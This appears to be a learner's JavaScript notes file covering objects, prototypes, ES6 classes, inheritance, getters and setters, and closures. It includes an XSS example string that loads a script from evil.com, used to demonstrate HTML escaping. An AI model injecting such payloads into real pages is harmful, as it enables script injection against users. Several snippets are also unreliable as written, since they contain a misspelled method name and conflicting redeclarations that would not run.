/*
    * Javascript Objects
    Prototype-Based object oriented programming in Javascript
    - Prototype-based !== Class based OOP
    additional information:
    - Javascript Objects
    https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Working_with_Objects
    - Javascript info Classes
    https://javascript.info/classes
    - Javascript info Prototypes and inheritance
    https://javascript.info/prototypes
*/

// Javascript objects can be used like Python dictonaries

// defining objects
const empty = {}
const new_object = new Object()
const obj = {"key1": "value1", "key2": "value2"}

// assign values
obj["key"] = "new_value"
obj.key1 = 25

// check if there is a property of "propertName" in obj
obj.hasOwnProperty("propertyName")

// returns an array of all properties of obj
Object.getOwnPropertNames(obj)

console.log("key" in obj)   // returns true

// print out all properties in objects
for (let property in "key1") console.log(property)


// * Extending Built-In Types

let mainVariable = "cat"
// example of XSS = Cross Site Scripting vulnerability
let hacker = "<script src='http://evil.com/evil.js'></script> Pretending good"

String.prototype.lastCharacter = function() {
    return this.charAt(this.length-1)
}

String.prototype.entitify = function() {
    return this.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&apos;")
}

console.log(mainVariable.lastCharacter(), "is the last character of mainVariable")
console.log(hacker)
console.log(hacker.entitify())

// ! classic style constructor
function ClassName(params) {
    this.value = params
}

// for example
function Circle(radius) {
    this.r = radius
}
Circle.PI = Math.PI
Circle.prototype.area = function() {
    return Circle.PI*this.r*this.r
}

// creating a new instance
let secondCircle = new Circle(10)
secondCircle.r = 3.5
let area = secondCircle.area()

// JS OOP Classic Style Continued
// without using prototype
function Circle(r) {
    this.r = r
    this.area = () => Math.PI*this.r*this.r
    // this.area = function() {
    //     return Math.PI*this.r*this.r
    // }
}

// ! ES6 Style class definitions
class Circle {
    constructor(r) {
        this.r = r
    }
    area() {
        return Math.PI*this.r*this.r
    }
}

// ! class inheritance
class Person {
    constructor(name, age=18) {
        this.name = name
        this.age = age
    }
    live() {
        console.log("I have a life")
    }
}
// class Student inherits Person class and extends it with id
class Student extends Person {
    // default values added to constructor
    constructor(name, age=20, id=0) {
        super(name, age) // call the super/father class constructor
        this.id = id
    }
    study() {
        console.log("All days only study and work, . No life!")
    }
    live() {
        console.log("I used to have a life.")
    }
}

const jack = new Student("Jack Student", 25, 13)
console.log(jack.name, jack.age, jack.id)
jack.live()
jack.study()

// * Methods for Prototypes

Object.create(proto,[description])
Object.getPrototypeOf(object)
Object.hasOwnProperty('name') // returns true if property is own and NOT inherited, otherwise false

// get properties of another object
let object1 = {name: "Jack", age: 25}
let object2 = {hobby: "gaming"}
Object.setPrototypeOf(object2, object1)
console.log(object2)

// create a new object from an old object
let object3 = Object.create(object1)
object3.address = "viertolantie 16"
for ( let prop in object3 ) console.log(prop)

/* 
    * Setters and Getters
    ! -set binds an object property to a setter function, which is called when attempting o set that property
    set propertyName(newValue) {
    }
    ! -get binds an object property to a getter function, which is called when attempting to read that property
    get propertName(newValue) {
        do something
        return newValue
    }
*/

class Stack {
    constructor() {
        this.stack = []
    }
    set latest(value) {
        this.stack.push(value)
    }
    get latest() {
        return this.stack.pop()
    }
}

let stack = new Stack()
stack.latest = 1
stack.latest = 2
console.log(stack.latest) // 2
console.log(stack.latest) // 1
console.log(stack.latest) // undefined

// ! Using Closure to create private things
// capitalized first character signals that this function is an object
function Person(name, age) {
    // you can use _name to signal private variables
    let _age = age // private
    return {    // public stuff here
        name: name, // public
        getAge: () => _age,
        setAge: (newAge) => (_age = newAge),
    }
}

let person = new Person("John", 30)
console.log(person.name, person.getAge())
delete person.age // this won't do anything
person.setAge(26)
console.log(person.name, person.getAge())
console.log(person.age) // undefined
console.log(person._age) // undefined
person.name = "Jane"
console.log(person.name, person.getAge())


class Account {
    constructor (balance) {
        this.balance = balance
    }
    deposit(amount) {
        this.balance += amount
        return this.balance
    }
    draw(amount) {
        // checks if balance is a bigger number than 0, if not, returns 0
        this.balance = Math.max(0, this.balance - amount)
        return this.balance
    }
}

class SavingsAccount extends Account {
    constructor(balance, interest = 0) {
        super(balance)
        this.interest = interest
    }
    payInterest() {
        this.balance *= 1 + this.interest / 100
        return this.balance
    }
}

let account = new Account(100)
console.log(account.deposit(500))
console.log(account.draw(100))
console.log(account.deposit(1500))
let save = new SavingsAccount(600)
console.log(save.deposit(400))
save.interest = 6
console.log(save.payInterest())